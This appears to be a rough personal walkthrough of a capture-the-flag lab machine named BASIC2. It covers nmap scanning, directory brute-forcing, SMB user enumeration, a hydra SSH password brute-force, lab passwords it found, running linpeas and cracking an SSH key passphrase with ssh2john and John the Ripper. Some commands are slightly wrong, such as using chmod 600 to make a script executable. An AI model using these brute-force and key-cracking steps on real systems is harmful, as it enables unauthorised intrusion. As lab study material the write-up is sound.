first nmap scan
nmap -sC -sV 10.10.147.143 -T4
 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-06 00:42 EDT
Stats: 0:00:46 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 00:43 (0:00:14 remaining)
Stats: 0:01:01 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 83.33% done; ETC: 00:43 (0:00:08 remaining)
Stats: 0:01:04 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 92.11% done; ETC: 00:43 (0:00:00 remaining)
Nmap scan report for 10.10.147.143
Host is up (0.15s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT      STATE    SERVICE            VERSION
22/tcp    open     ssh                OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
80/tcp    open     http               Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
139/tcp   open     netbios-ssn        Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open     etbios-  1 " @ Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
1048/tcp  filtered neod2
1105/tcp  filtered ftranhc
1812/tcp  filtered radius
8009/tcp  open     ajp13              Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8031/tcp  filtered unknown
8080/tcp  open     http-proxy
|_http-title: Apache Tomcat/9.0.7
|_http-favicon: Apache Tomcat
| fingerprint-strings: 
|   Socks4: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 2243
|     Date: Wed, 06 Sep 2023 04:43:26 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><bod
|   Socks5: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 2243
|     Date: Wed, 06 Sep 2023 04:43:25 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|_    Request</title><style type="text/css">h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><bod
41511/tcp filtered unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.94%I=7%D=9/6%Time=64F80369%P=x86_64-pc-linux-gnu%r(Soc
SF:ks5,95F,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/html;charset=utf
SF:-8\r\nContent-Language:\x20en\r\nContent-Length:\x202243\r\nDate:\x20We
SF:d,\x2006\x20Sep\x202023\x2004:43:25\x20GMT\r\nConnection:\x20close\r\n\
SF:r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>HTTP\x20Status\x
SF:20400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\x20type=\"text/cs
SF:s\">h1\x20{font-family:Tahoma,Arial,sans-serif;color:white;background-c
SF:olor:#525D76;font-size:22px;}\x20h2\x20{font-family:Tahoma,Arial,sans-s
SF:erif;color:white;background-color:#525D76;font-size:16px;}\x20h3\x20{fo
SF:nt-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;
SF:font-size:14px;}\x20body\x20{font-family:Tahoma,Arial,sans-serif;color:
SF:black;background-color:white;}\x20b\x20{font-family:Tahoma,Arial,sans-s
SF:erif;color:white;background-color:#525D76;}\x20p\x20{font-family:Tahoma
SF:,Arial,sans-serif;background:white;color:black;font-size:12px;}\x20a\x2
SF:0{color:black;}\x20a\.name\x20{color:black;}\x20\.line\x20{height:1px;b
SF:ackground-color:#525D76;border:none;}</style></head><bod")%r(Socks4,95F
SF:,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nC
SF:ontent-Language:\x20en\r\nContent-Length:\x202243\r\nDate:\x20Wed,\x200
SF:6\x20Sep\x202023\x2004:43:26\x20GMT\r\nConnection:\x20close\r\n\r\n<!do
SF:ctype\x20html><html\x20lang=\"en\"><head><title>HTTP\x20Status\x20400\x
SF:20\xe2\x80\x93\x20Bad\x20Request</title><style\x20type=\"text/css\">h1\
SF:x20{font-family:Tahoma,Arial,sans-serif;color:white;background-color:#5
SF:25D76;font-size:22px;}\x20h2\x20{font-family:Tahoma,Arial,sans-serif;co
SF:lor:white;background-color:#525D76;font-size:16px;}\x20h3\x20{font-fami
SF:ly:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-si
SF:ze:14px;}\x20body\x20{font-family:Tahoma,Arial,sans-serif;color:black;b
SF:ackground-color:white;}\x20b\x20{font-family:Tahoma,Arial,sans-serif;co
SF:lor:white;background-color:#525D76;}\x20p\x20{font-family:Tahoma,Arial,
SF:sans-serif;background:white;color:black;font-size:12px;}\x20a\x20{color
SF::black;}\x20a\.name\x20{color:black;}\x20\.line\x20{height:1px;backgrou
SF:nd-color:#525D76;border:none;}</style></head><bod");
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2023-09-06T04:43:41
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h20m04s, deviation: 2h18m34s, median: 3s
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2023-09-06T00:43:41-04:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.48 seconds


found 6 open ports

22/tcp    open     ssh                OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)

80/tcp    open     http               Apache httpd 2.4.18 ((Ubuntu))

8080/tcp  open     http-proxy

8009/tcp  open     ajp13              Apache Jserv (Protocol v1.3)

445/tcp   open     etbios-  1 " @ Samba smbd 4.3.11-Ubuntu (workgroup: 

139/tcp   open     netbios-ssn        Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

sudo dirsearch -u http://10.10.147.143 -w  -x 404,403 -t 200
found a hiden directory == /development

from /developmet directory, we know there are users name K, J

We know that user j has a weak password

using enum4linux to enumerate the smb port
enum4linux ipaddr
found username jan and kay

let bruteforce ssh account for jan with hydra
hydra -l jan -P /passlist.txt ssh://ip_addr
found password for jan === armando

lets sign to ssh
ssh jan@ipaddr

jan won't work as root.
let's excalate privilge
install linpeas with
sudo apt install peass

copy linpeas to victim device
scp /path/to/linpeas user@ipaddr:/dev/shm

make linpeas executable to user
chmod 600 linpeas.sh

run linpeas

found user kay ssh private key (id_rsa)
copy and save into a new file
asked for a pasword while trying to login

crack the key to find the pass

1) use ssh2john.py to convert key to password hash and save to a file

ssh2john is a utility to convert the key-file into a txt-format that would be suitable for JtR to crack by comparing hashes.

2) crack new hash with john the ripper with a suitable wordlist to get passwd

get pasword for kay = beeswax

login with ssh
ssh -i kay_id_rsa user@ipaddr
got a permission denied after entering passwd


note: so i spent a while here before i was able to login
found out i was suppose to change the permission for the ssh private key before login in 

chmod 600 kay_id_rsa

now login with ssh


cat /etc/os-release 2>/dev/null === find os running

